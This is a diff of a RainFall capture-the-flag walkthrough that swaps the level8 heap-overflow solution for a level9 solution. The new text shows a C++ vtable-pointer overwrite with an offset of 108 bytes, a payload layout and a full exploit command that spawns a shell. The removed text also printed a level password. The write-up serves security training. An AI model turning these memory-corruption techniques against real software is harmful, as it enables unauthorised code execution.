@@ -1,99 +1,147 @@
-# Level8
+# RainFall Walkthrough — Level 9 → Level 10
 
-## Objective
+## Step 1 — Program Structure
 
-The goal of Level 9 is to escalate from `level8` to `level9` by abusing how the `level8` binary manages heap allocations. By carefully using the available commands (`auth`, `reset`, `service`, and `login`), we can trigger the program to call `system("/bin/sh")` and gain a shell.
+The binary is a **C++ program** using classes and vtables. Let’s reconstruct the logic of `main`:
+
+```cpp
+int main(int argc, char **argv) {
+    if (argc < 2)
+        _exit(1);
+
+    N *a = new N(5);
+    N *b = new N(6);
+
+    a->setAnnotation(argv[1]);
+    (b->vtable->operator_plus)(b, a);
+}
+```
+
+Key points:
+
+* `N` has a **vtable pointer** at offset `0x0`.
+* `setAnnotation(argv[1])` copies input into an internal buffer with **no bounds check**.
+* At the end, `b->operator+(a)` is called **via the vtable**.
+
+👉 If we overwrite `b`’s vtable pointer, we control the function call.
 
 ---
 
-## Step 1: Examine the Binary
+## Step 2 — Vulnerable Function
 
-After switching to `level8`:
-
-Running the binary:
-
-```bash
-level8@RainFall:~$ ./level8
-(nil), (nil)
-heu bjr ?
-(nil), (nil)
+```cpp
+void N::setAnnotation(char *str) {
+    size_t len = strlen(str);
+    memcpy(this + 4, str, len);
+}
 ```
-With ltrace we can see that at the begining of the run the program uses printf imedietly.
-`printf(%p, %p\n, (nil), (nil)(nil), (nil))`
-It prints two empty pointers.
 
-```bash
-(gdb) info variables
-All defined variables:
-    0x08049aac auth
-    0x08049ab0 service
-    
-```
-Probably auth and service..
-`(auth, service)`, both initially `nil`. Input is read with `fgets()`.
+* Writes user input into the buffer at offset `+4`.
+* **No length check** → overflow into adjacent memory.
+* Eventually, we can overwrite the **vtable pointer at offset 0x0**.
+
+That’s the vulnerability.
 
 ---
 
-## Step 2: Disassembling the main
+## Step 3 — Virtual Call Mechanics
 
-Disassembly of `main()` reveals four commands or four steps:
+At the end of `main`, the code does:
 
-*It reads the input and store it as a buffer in the local memory. This buffer is compared 4 times in a raw to ascii strings. They're "auth", "service", "reset" and "service" 
+```asm
+mov eax, [esp+0x10]   ; eax = b
+mov eax, [eax]        ; eax = b->vtable
+mov edx, [eax]        ; edx = b->vtable[0]
+call edx              ; calls operator+
+```
 
-* `auth <data>` → calls `malloc(4)` and `strcpy()` into the global `auth` pointer.
-> Auth allocate a 4 octet space and store our argument inside. 
-* `reset` → frees the `auth` pointer.
-* `service <data>` → calls `strdup()` and copies into the global `service` pointer.
-* `login` → if `auth[32] != 0`, it calls `system("/bin/sh")`. Otherwise, it calls `fwrite()`.
-> This checks if there's something at the ofset 0x20 or [32]
-
-Thus, the game plan is to get `auth[32]` set to something non-zero.
+Normally → calls `N::operator+`.
+If we corrupt `b->vtable`, it will call **any address we control**.
 
 ---
 
-## Step 3: Heap Behavior
+## Step 4 — Exploit Strategy
 
-Heap allocations are sequential in memory. Testing shows:
-
-```bash
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-0x804a008, (nil)
-service
-0x804a008, 0x804a018
-```
-
-Here `auth` is at `0x804a008` and `service` is exactly 16 bytes later. With padding, we can arrange things so that writing into `service` overflows into `auth[32]`.
+1. Create object `a` and `b`.
+2. Use `a->setAnnotation(argv[1])` to overflow into `b`.
+3. Overwrite `b->vtable` with a pointer inside our buffer.
+4. Place a fake vtable and shellcode there.
+5. When `b->operator+(a)` is called → it jumps to our shellcode.
 
 ---
 
-## Step 4: Exploit Strategy
+## Step 5 — Finding the Offset
 
-**Solution `service` overflow:**
+Using a cyclic pattern, crash analysis showed:
 
-* Create `auth` → allocates 4 bytes.
-* Create `service` with a payload long enough to cover the 16-byte padding and reach `auth+32`.
-
-```bash
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-0x804a008, (nil)
-serviceaaaaaaaaaaaaaaaa
-0x804a008, 0x804a018
-login
-$ whoami
-level9
+```
+eax = 0x41366441
 ```
 
-## Step 5: Escalate to Level9
+This corresponds to **offset 108**.
 
-Once `login` succeeds, we get a shell as `level9`:
+So: after 108 bytes, we reach and overwrite the vtable pointer.
 
-```bash
-$ cat /home/user/level9/.pass
-c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+---
+
+## Step 6 — Crafting the Payload
+
+Memory layout we want:
+
+```
+[ fake vtable entry ] → shellcode address
+[ shellcode ]         → execve("/bin/sh")
+[ padding ]
+[ overwrite vtable ]  → pointer to fake vtable
 ```
 
-**End of Level8 Walkthrough**
+Example payload:
+
+```python
+python -c 'print "\x10\xa0\x04\x08" + SHELLCODE + "A"*76 + "\x0c\xa0\x04\x08"'
+```
+
+At runtime:
+
+* `b->vtable = 0x804a00c` (points into our buffer).
+* `b->vtable[0] = 0x804a010` (points at our shellcode).
+* Program executes `call edx` → jumps into shellcode. ✅
+
+---
+
+## Step 7 — Why Use Shellcode
+
+* Earlier levels relied on GOT overwrites.
+* Here, vtable corruption is simpler.
+* **NX is disabled**, so injected shellcode runs.
+* `system()` isn’t directly available → shellcode is the clean solution.
+
+---
+
+## Step 8 — Memory Visualization
+
+### Before Overflow
+
+```
+b->vtable → [0x08048848] → legit N::operator+()
+```
+
+### After Overflow
+
+```
+b->vtable → [0x0804a00c] → [0x0804a010] → SHELLCODE!
+```
+
+So the virtual function call ends up running our shellcode.
+
+---
+
+## Final Step — Success
+
+Exploit command:
+
+```bash
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + SHELLCODE + "A"*76 + "\x0c\xa0\x04\x08"')
+```
+
+This spawns a shell as **level10**.
